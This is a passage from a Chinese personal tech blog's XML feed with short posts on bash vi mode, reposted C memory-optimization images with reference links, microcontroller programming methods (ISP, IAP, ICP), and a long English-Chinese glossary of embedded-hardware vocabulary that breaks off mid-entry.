<br></code></pre></td></tr></table></figure><p>如果切换到vi模式下，则进入bash时就是插入模式。并且上面的快捷键都无法使用。其他操作都和vi编译器一致。</p><p>如果位于命令模式则<code>v</code>可以直接进入vi。</p>]]></content>
    
    
    <categories>
      
      <category>bash</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>链接相关</title>
    <link href="/2023/12/25/%E9%93%BE%E6%8E%A5%E7%9B%B8%E5%85%B3/"/>
    <url>/2023/12/25/%E9%93%BE%E6%8E%A5%E7%9B%B8%E5%85%B3/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>C语言内存优化5</title>
    <link href="/2023/12/24/C%E8%AF%AD%E8%A8%80%E5%86%85%E5%AD%98%E4%BC%98%E5%8C%965/"/>
    <url>/2023/12/24/C%E8%AF%AD%E8%A8%80%E5%86%85%E5%AD%98%E4%BC%98%E5%8C%965/</url>
    
    <content type="html"><![CDATA[<p>内存优化</p><span id="more"></span><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312242312527.png"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://developer.aliyun.com/article/624466">https://developer.aliyun.com/article/624466</a></p>]]></content>
    
    
    <categories>
      
      <category>c</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言内存优化4</title>
    <link href="/2023/12/24/C%E8%AF%AD%E8%A8%80%E5%86%85%E5%AD%98%E4%BC%98%E5%8C%964/"/>
    <url>/2023/12/24/C%E8%AF%AD%E8%A8%80%E5%86%85%E5%AD%98%E4%BC%98%E5%8C%964/</url>
    
    <content type="html"><![CDATA[<p>内存优化</p><span id="more"></span><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312242311672.png"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://developer.aliyun.com/article/624467?spm=a2c6h.14164896.0.0.46e647c5Ly8hUw&scm=20140722.S_community@@%E6%96%87%E7%AB%A0@@624467._.ID_624467-RL_%E6%97%A0%E6%AD%A2%E5%A2%83%E7%9A%84%E5%86%85%E5%AD%98%E4%BC%98%E5%8C%96%E2%80%94%E2%80%94%E5%81%9C%E4%B8%8D%E4%B8%8B%E7%9A%84%E5%BE%AA%E7%8E%AF-LOC_search~UND~community~UND~item-OR_ser-V_3-P0_0">https://developer.aliyun.com/article/624467?spm=a2c6h.14164896.0.0.46e647c5Ly8hUw&amp;scm=20140722.S_community@@%E6%96%87%E7%AB%A0@@624467._.ID_624467-RL_%E6%97%A0%E6%AD%A2%E5%A2%83%E7%9A%84%E5%86%85%E5%AD%98%E4%BC%98%E5%8C%96%E2%80%94%E2%80%94%E5%81%9C%E4%B8%8D%E4%B8%8B%E7%9A%84%E5%BE%AA%E7%8E%AF-LOC_search~UND~community~UND~item-OR_ser-V_3-P0_0</a></p>]]></content>
    
    
    <categories>
      
      <category>c</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言内存优化3</title>
    <link href="/2023/12/24/C%E8%AF%AD%E8%A8%80%E5%86%85%E5%AD%98%E4%BC%98%E5%8C%963/"/>
    <url>/2023/12/24/C%E8%AF%AD%E8%A8%80%E5%86%85%E5%AD%98%E4%BC%98%E5%8C%963/</url>
    
    <content type="html"><![CDATA[<p>内存优化</p><span id="more"></span><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312242310698.png"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://developer.aliyun.com/article/624468?spm=a2c6h.13262185.profile.50.7d7d9c2dK3kPS5">https://developer.aliyun.com/article/624468?spm=a2c6h.13262185.profile.50.7d7d9c2dK3kPS5</a></p>]]></content>
    
    
    <categories>
      
      <category>c</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言内存优化2</title>
    <link href="/2023/12/24/C%E8%AF%AD%E8%A8%80%E5%86%85%E5%AD%98%E4%BC%98%E5%8C%962/"/>
    <url>/2023/12/24/C%E8%AF%AD%E8%A8%80%E5%86%85%E5%AD%98%E4%BC%98%E5%8C%962/</url>
    
    <content type="html"><![CDATA[<p>内存优化</p><span id="more"></span><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312241836798.png"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="http://hzhcontrols.com/new-35031.html">http://hzhcontrols.com/new-35031.html</a></p>]]></content>
    
    
    <categories>
      
      <category>c</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言内存优化1</title>
    <link href="/2023/12/24/C%E8%AF%AD%E8%A8%80%E5%86%85%E5%AD%98%E4%BC%98%E5%8C%961/"/>
    <url>/2023/12/24/C%E8%AF%AD%E8%A8%80%E5%86%85%E5%AD%98%E4%BC%98%E5%8C%961/</url>
    
    <content type="html"><![CDATA[<p>内存优化</p><span id="more"></span><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312241826219.png"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://blog.csdn.net/sinat_36098122/article/details/80652853?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170341241416800215097032%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=170341241416800215097032&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-80652853-null-null.nonecase&utm_term=%E5%86%85%E5%AD%98%E4%BC%98%E5%8C%96&spm=1018.2226.3001.4450">https://blog.csdn.net/sinat_36098122/article/details/80652853?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170341241416800215097032%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=170341241416800215097032&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-80652853-null-null.nonecase&amp;utm_term=%E5%86%85%E5%AD%98%E4%BC%98%E5%8C%96&amp;spm=1018.2226.3001.4450</a></p>]]></content>
    
    
    <categories>
      
      <category>c</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>单片机三种烧录方式ISP、IAP和ICP有什么不同?</title>
    <link href="/2023/12/24/%E5%8D%95%E7%89%87%E6%9C%BA%E4%B8%89%E7%A7%8D%E7%83%A7%E5%BD%95%E6%96%B9%E5%BC%8FISP%E3%80%81IAP%E5%92%8CICP%E6%9C%89%E4%BB%80%E4%B9%88%E4%B8%8D%E5%90%8C/"/>
    <url>/2023/12/24/%E5%8D%95%E7%89%87%E6%9C%BA%E4%B8%89%E7%A7%8D%E7%83%A7%E5%BD%95%E6%96%B9%E5%BC%8FISP%E3%80%81IAP%E5%92%8CICP%E6%9C%89%E4%BB%80%E4%B9%88%E4%B8%8D%E5%90%8C/</url>
    
    <content type="html"><![CDATA[<p>三种烧录方式的不同</p><span id="more"></span><h1 id="ISP"><a href="#ISP" class="headerlink" title="ISP"></a>ISP</h1><p>ISP：In System Programing，在系统编程。我们使用调试器将程序烧录近单片机就是这种方法。</p><h1 id="IAP"><a href="#IAP" class="headerlink" title="IAP"></a>IAP</h1><p>IAP：In applicaTIng Programing，在应用编程。在程序运行的过程中进行编程（升级程序，更新固件）。</p><p>这种方法相较于ISP更加方便，因为这种方法可以使用网络等方式进行远程烧录、更新。</p><h1 id="ICP"><a href="#ICP" class="headerlink" title="ICP"></a>ICP</h1><p>ICP：In Circuit Programing，在电路编程。如：对EEPROM编程等</p><p>这个方式使用少</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.eet-china.com/mp/a265662.html">https://www.eet-china.com/mp/a265662.html</a></p>]]></content>
    
    
    <categories>
      
      <category>stm32</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>嵌入式常见英文2500词总结</title>
    <link href="/2023/12/24/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%B8%B8%E8%A7%81%E8%8B%B1%E6%96%872500%E8%AF%8D%E6%80%BB%E7%BB%93/"/>
    <url>/2023/12/24/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%B8%B8%E8%A7%81%E8%8B%B1%E6%96%872500%E8%AF%8D%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>总结了嵌入式领域中常用的英文单词</p><span id="more"></span><div id="article_content" class="article_content clearfix">        <link rel="stylesheet" href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/kdoc_html_views-1a98987dfd.css">        <link rel="stylesheet" href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/ck_htmledit_views-044f2cf1dc.css">                <div id="content_views" class="htmledit_views">                    <p id="main-toc"><strong></strong></p> <p id="" style="margin: 0px 0px 2px; padding-left: 24px;"><a href="#%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%A1%AC%E4%BB%B6%E5%B8%B8%E8%A7%81%E8%8B%B1%E6%96%87%E6%80%BB%E7%BB%93" rel="nofollow" target="_self"></a></p> <p id="" style="margin: 0px 0px 2px; padding-left: 24px;"><a href="#t1" rel="nofollow" target="_self"></a></p> <p id="" style="margin: 0px 0px 2px; padding-left: 24px;"><a href="#t2" rel="nofollow" target="_self"></a></p> <hr id="hr-toc"> <h2><a name="t0"></a><a href="https://so.csdn.net/so/search?q=%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%A1%AC%E4%BB%B6&amp;spm=1001.2101.3001.7020" target="_blank" class="hl hl-1" data-report-click="{&quot;spm&quot;:&quot;1001.2101.3001.7020&quot;,&quot;dest&quot;:&quot;https://so.csdn.net/so/search?q=%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%A1%AC%E4%BB%B6&amp;spm=1001.2101.3001.7020&quot;,&quot;extra&quot;:&quot;{\&quot;searchword\&quot;:\&quot;嵌入式硬件\&quot;}&quot;}" data-tit="嵌入式硬件" data-pretit="嵌入式硬件">嵌入式硬件</a>常见英文总结</h2> <blockquote>  <p>block diagram，框图</p>  <p>figure，图形，图标</p>  <p>processor，处理器</p>  <p>Mirrored region，镜像空间</p>  <p>cost-effective，性价比高</p>  <p>low power，低功耗</p>  <p>high performance，高性能</p>  <p>namely，即; 也就是</p>  <p>configure，配置</p>  <p>corresponding，符合的; 相应的; 相关的</p>  <p>resume，重新开始; (中断后)继续; 恢复席位 / 地位 / 职位</p>  <p>malfunction，故障; 失灵; 功能障碍</p>  <p>noise，干扰；电子干扰讯号; 干扰信息</p>  <p>request ，请求</p>  <p>generate，生成，产生</p>  <p>Activate，使活动; 激活; 使活化</p>  <p>Level-triggered，水平触发</p>  <p>edge-Triggered，边沿触发</p>  <p>mechanism，机械装置; 机件; 方法; 机制; (生物体内的)机制，构造</p>  <p>Prescaler，预<a href="https://so.csdn.net/so/search?q=%E5%88%86%E9%A2%91%E5%99%A8&amp;spm=1001.2101.3001.7020" target="_blank" class="hl hl-1" data-report-click="{&quot;spm&quot;:&quot;1001.2101.3001.7020&quot;,&quot;dest&quot;:&quot;https://so.csdn.net/so/search?q=%E5%88%86%E9%A2%91%E5%99%A8&amp;spm=1001.2101.3001.7020&quot;,&quot;extra&quot;:&quot;{\&quot;searchword\&quot;:\&quot;分频器\&quot;}&quot;}" data-tit="分频器" data-pretit="分频器">分频器</a></p>  <p>Counter，计数器</p>  <p>factor，因素</p>  <p>specified，指定的</p>  <p>Valid，有效的</p>  <p>frequency division factor，分频因子</p>  <p>consideration，考虑</p>  <p>debug，调试</p>  <p>determine，决定</p>  <p>expire，到期</p>  <p>signal is asserted，信号被置位</p>  <p>the reset output of the watchdog timer，看门狗定时器的复位输出</p>  <p>Reset，重置，复位</p>  <p>desired，想要的，希望的</p>  <p>ApplicationNote，应用笔记</p>  <p>Preliminary，初步的</p>  <p>full characterization data and associated errata，完整的特性数据和相关勘误表</p> </blockquote> <blockquote>  <p>phase，阶段、时期</p>  <p>Crystal oscillator，晶振</p>  <p><span style="color:#fe2c24;">resonator </span>&nbsp;[ˈrezəneɪtər]共振器 共鸣箱</p>  <p>oscillation amplifier，震荡放大器</p>  <p>glitch-free，无干扰</p>  <p>glitch 小故障 失灵 短时脉冲波干扰 毛刺</p>  <p>peripheral，外围设备</p>  <p>comprise，包含</p>  <p>comprises of，包括</p>  <p>is composed of，由……组成</p>  <p>asynchronous，异步的</p>  <p>synchronous，同步的</p>  <p>classification，分类</p>  <p>intermediate，中间的</p>  <p>component，组成部分</p>  <p>crystal clock，石英钟</p>  <p>Rules to follow，要遵守的规则</p>  <p>Equation，方程式</p>  <p>ratio，比率</p>  <p>clock gating，时钟选通</p>  <p>gate&nbsp;大门；登机口；闸门，阀门</p>  <p>mask，面具，隐藏，关闭，屏蔽</p>  <p>interrupt-based，基于中断的</p>  <p>baud，波特率</p>  <p>infrared，红外线的</p>  <p>shifter，移位器</p>  <p>shift，转移</p>  <p>handshake，握手</p>  <p>reception，接待</p>  <p>frame，帧，框架</p>  <p>framework，框架</p>  <p>overrun，超限</p>  <p>break condition，中断条件</p>  <p>indicate，表明</p>  <p>hold，保持，阻塞</p>  <p>Modem，调制解调器</p>  <p>Pend，挂起</p>  <p>accurately，准确</p>  <p>In addition，此外</p>  <p>stabilize，稳定，稳固</p>  <p>fin/fout，输入频率和输出频率</p>  <p>parity check，奇偶校验;（尤指薪金或地位）平等，相同</p>  <p>priority&nbsp;优先事项，最重要的事；优先，优先权</p>  <p>polarity&nbsp;极性；两极；对立</p>  <p>implicit 隐含的，含蓄的</p>  <p>interrupt service routines，中断服务程序</p>  <p>prefetch，预取</p>  <p>distinction，差别;区别;对比;优秀;杰出;卓越</p>  <p>distinct，不同的,有区别的</p>  <p>distinguish，区分;辨别;分清;</p>  <p>distinctive，独特的</p>  <p>distinctive features，特色</p>  <p>capability，能力，功能</p>  <p>Alternatively，或者</p>  <p>parameter，参数</p>  <p>take effect，生效</p>  <p>manually，手动</p>  <p>down-counter，下行计数器</p>  <p>scheme，计划</p>  <p>Observation，观察</p> </blockquote> <blockquote>  <p>inverter，反相器，逆变器</p>  <p>invert使倒置，使反转；使（位置、顺序或关系）颠倒，使互换</p>  <p>reverse逆转，彻底改变,相对，相反,颠倒，反转；交换，互换,倒（车）;（发动机）反向运转</p>  <p>Ethernet，以太网</p>  <p>Secure Digital，安全数字卡，即SD卡</p>  <p>combo host，组合主机</p>  <p>combo box组合框</p>  <p><span style="color:#fe2c24;">simultaneously，</span>&nbsp;[ˌsaɪm(ə)lˈteɪniəsli]<span style="color:#fe2c24;">同时</span></p>  <p>Suspend，暂停，挂起</p>  <p>pend&nbsp;悬挂；垂下,阻塞</p>  <p>append附加，增补</p>  <p>slave，奴隶，从动装置</p>  <p>flow chart，流程图</p>  <p>Timeout checking，超时检查</p>  <p>internally，内部的</p>  <p>implement，实施，使生效，执行，工具，器具</p>  <p>owing to，由于，因为</p>  <p>moderately，适度的</p>  <p>validate，验证，使生效，使合法化</p>  <p>legal合法的</p>  <p>valid有效的；正当的，合理的</p>  <p>acknowledge，承认，确认,告知收到</p>  <p>sensor，传感器</p>  <p>intend，打算</p>  <p>intend on doing sth，打算做某事</p>  <p>dedicate，致力于，献身于，奉献</p>  <p>vertical，垂直的</p>  <p>horizontal，水平的</p>  <p>start stop，缩写为s和p</p>  <p>blend，融合，协调</p>  <p>color key，颜色键</p>  <p>overlay，覆盖</p>  <p>I/F，常作为interface的缩写，意思是接口</p>  <p>latch 闩锁</p> </blockquote> <blockquote>  <p>Cable，电线<br> router, 路由器</p>  <p>route路线，航线；道路，路途</p>  <p>switch，交换机<br> display显示器</p>  <p>transistor，晶体管</p>  <p>diode，二极管</p>  <p>triode，三极管</p>  <p>三极管和场效应管统称为晶体管，三极管是晶体管的一种，二极管也是晶体管，这一点是根据其实质来说的。</p>  <p>field effect 场效应</p>  <p>communication，通信</p>  <p>pulse，脉冲</p>  <p>width，宽度</p>  <p>modulation，调制</p>  <p>Analog，模拟，模拟信号</p>  <p>embedded，嵌入的</p>  <p>resistor，电阻器</p>  <p>register，寄存器</p> </blockquote> <blockquote>  <p>glitch free mux，无故障多路复用器</p>  <p>multiplexer数据选择器</p>  <p>without the prior written consent 未经事先书面通知</p>  <p>prior先前的，事先的</p>  <p>written书面的，（协议、规定、法律等）成文的</p>  <p>consent许可，允许；同意，赞同；正式批准文件，批文</p>  <p>descent下降，降落；斜坡，斜面</p>  <p>decent得体的，合宜的</p>  <p>decline下降，衰退；拒绝，谢绝</p>  <p>codec编码解码器</p>  <p>Compression/decompression压缩/解压缩</p>  <p>bit field位段</p>  <p>exti外部中断，external interruption</p>  <p>setup（软件或硬件的）安装</p>  <p>install安装，设置</p>  <p>pull-up和pull-down上拉电阻/下拉电阻</p>  <p>instrument,，仪器</p>  <p>device装置，设备；手段，方法</p>  <p>vacuum tube真空管</p>  <p>mother board，底板、装配板、主机板</p>  <p>wafer，晶元，晶片</p>  <p>Port&nbsp;to，移植到</p>  <p>Port&nbsp;港口，避风港，（计算机）端口，接口；v转移，移植（软件）</p>  <p>Full-featured，全功能的，功能全面的</p>  <p>X-Plore，是一款功能强大的文件管理器，文件管理器，文件管理</p> </blockquote> <blockquote>  <p>motion video processing，运动视频处理</p>  <p>processing加工；处理；运算</p>  <p>accelerator，加速器</p>  <p>scaling，分频</p>  <p>H/W，hardware<br> Integrated Multi Format Codec (MFC)集成多格式编解码器<br> video conference，视频会议</p>  <p>high-end communication services高端通信服务</p>  <p>high-end高端的；高档的</p>  <p>parallel access，并行访问</p>  <p>parallel 平行的；相似的，同时发生的；（计算机）并行的；并联的</p>  <p>horizontal水平的;与地面平行的;横的;水平面;横线;</p>  <p>true color，真彩色</p>  <p>small form factor，小形状因子</p>  <p>form形成；构成,表，表格；类别，种类</p>  <p>format版式；（录像、激光唱片、磁带等的）格式,为……编排格式；格式化</p>  <p>chart图表，曲线图等</p>  <p>diagram图表，图解；几何图形</p>  <p>connectivity，连接，接口</p>  <p>byte code，字节码（就是一串具有某种含义的字节）</p>  <p>pipeline，管道</p>  <p>10-stage，10级</p>  <p>Hybrid，混合的</p>  <p><span style="color:#fe2c24;">Composite&nbsp;</span>[kəmˈpɑːzət]<span style="color:#fe2c24;">合成的，复合的；合成物，复合材料；合成（图片）</span></p>  <p>compound混合物，化合物；复合词；复合的，混合的；</p>  <p>polarity，极性</p>  <p>resolution，解决，决心，决定；清晰度，分辨率</p>  <p>revolution（思想、工作方式等的）彻底变革；（使用武力、暴力的）革命；</p>  <p>resolve解决（问题或困难）；决定，下定决心；作出决议</p>  <p>dissolve&nbsp;美 /[dɪˈzɑːlv]&nbsp;v.溶;使(固体)溶解;</p>  <p>solution&nbsp;&nbsp;&nbsp;美 /[səˈluːʃn]&nbsp;n.解决方案;溶液;</p>  <p>High-definition，高清晰度</p>  <p>intra，内部</p>  <p>De-blocking (in-loop) filter去阻塞（环路）滤波器</p>  <p>Slice Structured Mode，切片结构模式</p>  <p>slice薄片，切成薄片</p>  <p>passive，无源的，消极的，被动的；被动语态的；</p>  <p>active，有源的</p>  <p>restrict限制，受限</p>  <p>restriction限制，约束</p>  <p><span style="color:#fe2c24;">constraint&nbsp;</span>&nbsp;[kənˈstreɪnt]限制;限定;约束;严管</p>  <p>transient&nbsp;美 /[ˈtrænʃnt]&nbsp;adj.转瞬即逝的;短暂的;倏忽;暂住的;过往的;临时的n.暂住某地的人;过往旅客;临时工</p>  <p>Prediction Mode预测模式</p>  <p>overlapped motion compensation for luminance，亮度的重叠运动补偿</p>  <p>overlap（与……）互搭，（与……）复叠</p>  <p><span style="color:#fe2c24;">luminance </span>[ˈluːmɪnəns]<span style="color:#fe2c24;">[光][电子]亮度</span></p>  <p>profile配置文件，用户配置文件，档案资料</p>  <p>Baseline Profile基本配置</p>  <p>Decoding supports Main Profile High level解码支持主配置文件高级别</p>  <p>Tile-based，指一种架构</p>  <p>tile（贴墙或铺地用的）瓷砖，地砖,（铺屋顶的）瓦，瓦片,（计算机）平铺（窗口）</p>  <p>Universal Scalable Shader Engine，通用可伸缩着色器引擎</p>  <p>shader阴影，着色</p>  <p>multi-threaded engine incorporating Pixel and Vertex Shader functionality包含像素和顶点着色器功能的多线程引擎</p>  <p><span style="color:#fe2c24;">incorporate </span>&nbsp;[ɪnˈkɔːrpəreɪt]<span style="color:#fe2c24;">包含，合并；合成一体的，合并的</span></p>  <p>Vertex顶点</p>  <p>grained task switching, load balancing, and power management细粒度任务切换、负载平衡和电源管理</p>  <p>power控制力，操控力；权力，职权；统治，政权,力量，体能；能源，（尤指）电力；动力，功率;驱动，推动（机器或车辆）</p>  <p>grain谷物，谷粒；颗粒，细粒</p>  <p><span style="color:#fe2c24;">geometry，</span>&nbsp;[dʒiˈɑːmətri]<span style="color:#fe2c24;">几何学;几何形状;几何结构;几何图形</span></p>  <p><span style="color:#fe2c24;">geometric </span>&nbsp;[ˌdʒiːəˈmetrɪk]<span style="color:#fe2c24;">几何图形的；几何的，几何学的；</span></p>  <p><span style="color:#fe2c24;">geography </span>&nbsp;[dʒiˈɑːɡrəfi]<span style="color:#fe2c24;">地理，地理学；地形，地貌；地理环境</span></p>  <p><span style="color:#fe2c24;">geology </span>[dʒiˈɑːlədʒi]<span style="color:#fe2c24;">地质学；地质状况</span></p>  <p>general-purpose color-space converter通用颜色空间转换器</p>  <p>convert（使）转变，（使）转换；（使）改变信仰，（使）皈依</p>  <p>general总体的，普遍的；一般的，常规的;将军；</p>  <p>universal普遍的，全体的，全世界的；通用的，万能的</p>  <p>normal正常的，标准的；</p>  <p>ordinary普通的，平常的；平淡无奇的，平庸的</p>  <p>common共同的，共享的；常见的，普遍的，</p>  <p>usual通常的，惯常的</p>  <p>interaction，交互，相互作用</p>  <p>minimum CPU interaction最低限度的CPU交互</p>  <p>anti-aliasing抗锯齿</p>  <p>anti一般带“反对，抵抗”等含义</p>  <p>Fully virtualized memory addressing完全虚拟化内存寻址</p>  <p>addressing寻址；定址；访问</p>  <p><span style="color:#fe2c24;">unified</span>，&nbsp;[ˈjuːnɪfaɪd]统一的</p>  <p>unify（使）联合，（使）统一；使协调</p>  <p>functioning，运行，运作；[计]功能；机能</p>  <p>Window clipping，窗口剪裁</p>  <p>clip夹子，别针，修剪；剪下；减少，缩短</p>  <p>reverse，逆转，逆向</p>  <p>4-operand raster4操作数光栅</p>  <p><span style="color:#fe2c24;">Arbitrary </span>size pixel pattern drawing, Pattern cache任意大小的像素图案绘制，图案缓存</p>  <p><span style="color:#fe2c24;">Arbitrary </span>&nbsp;[ˈɑːrbɪtreri]任意的，随心所欲的；专横的，武断的</p>  <p>Packed 24-bpp color format压缩24 bpp彩色格式</p>  <p>flip vertical, and flip horizontal 垂直翻转和水平翻转</p>  <p>flip （使）快速翻转，迅速翻动；快速翻阅；轻抛，轻掷，轻击</p>  <p>vertical scaling，垂直缩放</p>  <p>Video Mixer视频混合器</p>  <p>Four layers四层</p>  <p>multiplex多路复用，多路传输</p>  <p>L2&nbsp;cache&nbsp;二级缓存</p>  <p>secure platform安全平台</p>  <p>separate execution environment for security sensitive application安全敏感应用程序的单独执行环境</p> </blockquote> <blockquote>  <p>authentication，验证</p>  <p>stereo，美 /[ˈsterioʊ]立体声，立体的</p>  <p>Variable sampling rate，可变采样率</p>  <p>Variable 易变的，多变的；时好时坏的；可变的，可调节的</p>  <p>vary（使）不同，（使）呈现差异；（根据情况而）变化，改变；改变，使……变化；变奏</p>  <p>various各种各样的；迥异的，千差万别的</p>  <p>variety多样化，变化；种类，品种；</p>  <p>Full Specification 全规格</p>  <p><span style="color:#fe2c24;">Specification </span>[ˌspesɪfɪˈkeɪʃ(ə)n]规格 规范</p>  <p>spec规格</p>  <p>specified规定的；详细说明的</p>  <p>specific明确的，具体的；特定的；特有的，独特的</p>  <p>alternately filled with data 交替填充数据</p>  <p><span style="color:#fe2c24;">alternately&nbsp;</span>&nbsp;[ˈɔːltərnətli]交替地；轮流地</p>  <p>alternative&nbsp;美 /[ɔːlˈtɜːrnətɪv]&nbsp;adj.可供替代的;另类的;非传统的n.可供选择的事物</p>  <p><span style="color:#fe2c24;">justified&nbsp;</span>&nbsp;[ˈdʒʌstɪfaɪd]有正当理由的，有合理解释的；（页面文字）右侧/左侧对齐的</p>  <p><span style="color:#fe2c24;">justify&nbsp;</span>&nbsp;[ˈdʒʌstɪfaɪ]是……的正当理由；对……作出解释，为……辩解；使（文本）对齐</p>  <p>oriented and bi-directional，定向和双向</p>  <p>orient朝向，面对，使适合；定向放置（某物）；确定方位</p>  <p>directional方向的</p>  <p>bi-前置一般指“双”，比如Bi-Channel，双通道</p>  <p>Compatible，可共用的，兼容的，合得来的</p>  <p>incompatible 不相容的; 不兼容; (与某事物)不一致，不相配; (与某人)合不来，不能和睦相处; (与某物)不匹配; 配伍禁忌的; 互斥的;</p>  <p><span style="color:#fe2c24;">compatibility</span>，[kəmˌpætəˈbɪləti]兼容性</p>  <p>accompany陪同;陪伴;伴随;与…同时发生;</p>  <p>comparable类似的;可比较的</p>  <p>comparison比较;对比;相比</p>  <p>compare&nbsp;比较，对比；把……比作</p>  <p><span style="color:#fe2c24;">compact&nbsp;</span>&nbsp;[kəmˈpækt]紧凑的;紧密的;小型的;袖珍的;体积小的;协议，合约</p>  <p>CompactFlash闪存卡;闪存;压缩闪存;内存;</p>  <p>Loop back mode环回模式</p>  <p><span style="color:#fe2c24;">integer</span>，&nbsp;[ˈɪntɪdʒər]整数</p>  <p><span style="color:#fe2c24;">Comply</span>，&nbsp;[kəmˈplaɪ]遵从，遵守</p>  <p>compile，编写，编译</p>  <p>flow control流控</p> </blockquote> <blockquote>  <p>de-bounce filter去抖动滤波器</p>  <p>de-前置有“去除，去掉”之意</p>  <p>Pulse Width Modulation&nbsp;脉宽调制</p>  <p>duty cycle占空比</p>  <p>duty ratio占空比</p>  <p>duty责任，义务；上班，值班；职责，任务；</p>  <p>empty空的；空洞的，无意义的；空虚的；无知的，愚蠢的</p>  <p>Dead-zone generation死区生成器</p>  <p>exact精确的，准确的，精密的</p>  <p>built-in内置的</p>  <p>mask out particular interrupt requests屏蔽特定中断请求</p>  <p>particular 特定的，某一的；格外的，特别的</p>  <p>Prioritization of interrupt sources for interrupt nesting中断源优先级用于中断嵌套</p>  <p>nest窝，巢，穴,（一套物件）逐个套叠；嵌套（信息）</p>  <p>Idle空闲的，闲置的</p>  <p>ideal完美的;理想的;</p>  <p>idea想法，主意；观点，看法；原则，信念；</p>  <p>chunk大块</p>  <p>Bump map/Ball map是芯片封装的两种技术</p>  <p>Bottom View底视图</p>  <p>transmit传输，发射</p>  <p>detect检测，发现</p>  <p>Dedicated专用的</p>  <p>dedicate致力于，献身于</p>  <p>delicate虚弱的，纤弱的；脆弱的,精致的，精巧的；</p>  <p>Pull-down resistor（pull-low）下拉电阻</p>  <p>Pull-up resistor（pull-high）上拉电阻</p>  <p>System Warm Reset系统热复位</p>  <p>Regulator调节器，稳压器</p>  <p>Receptacle容器，插座,[植] 花托</p>  <p>accept接受，收受；同意，赞成；</p>  <p>subdivide细分</p>  <p>Isource，驱动上拉电流，拉电流，首字母为电流表示I</p>  <p>Isink，驱动下拉电流，灌电流，首字母为电流表示I</p>  <p>bi-direction双向</p>  <p>Fixed Priority固定优先级</p>  <p>corresponding bit对应位</p>  <p>Falling edge triggered 下降沿触发</p>  <p>Rising edge triggered上升沿触发</p>  <p>Both edge triggered双边触发</p>  <p>wake-up source唤醒源</p>  <p>Digital filter数字滤波器</p>  <p>clock count时钟计数</p>  <p>Filtering width过滤宽度</p>  <p>clock management unit (CMU) 时钟管理单元</p>  <p>power management unit (PMU)电源管理单元</p>  <p>system controller (SYSCON)系统控制器</p>  <p>classification分类</p>  <p>phy物理层</p>  <p>pad就先理解成“引脚”吧</p>  <p>intermediate frequencies中频</p>  <p>result in导致</p>  <p>result from源自</p>  <p>stabilize使稳定</p>  <p>clock mux时钟多路选择器</p>  <p>suffer from glitches遭受干扰</p>  <p>parenthesis圆括号(复数parentheses)</p>  <p>Special Functional Register (SFR)特殊功能寄存器</p>  <p>period时期，一段时间</p>  <p>adaptive frequency curve自适应频率曲线</p>  <p>adaptive 适应的，有适应能力的</p>  <p>adapt适应；调整，使适合；改编；改造，改装</p>  <p>adopt收养；采取，采纳</p>  <p>high phase noise高相位噪声</p>  <p>scenario脚本</p>  <p>emulation mode仿真模式</p>  <p>emulation仿效，模仿；仿真</p>  <p>simulation模拟，仿造物；假装，冒充</p>  <p>stimulation刺激，激励，兴奋作用</p>  <p>formulation制定，构想,配方，配方产品</p>  <p>accumulation积累，堆积；堆积物，堆积量</p>  <p>how often PWM，pwm频率</p>  <p><span style="color:#fe2c24;">Miscellaneous&nbsp;</span>&nbsp;[ˌmɪsəˈleɪniəs]混杂的，各种各样的，多才多艺的</p>  <p>Misc混杂的，各种各样的，多才多艺的</p>  <p>Endian selection字节序选择</p>  <p>endian字节存储顺序;字节序</p>  <p>big endian大端字节序（endian貌似是计算机领域造的一个词，词典里搜不到）</p>  <p>little endian小端字节序</p>  <p>Mobile application processors移动应用处理器</p>  <p>consume less 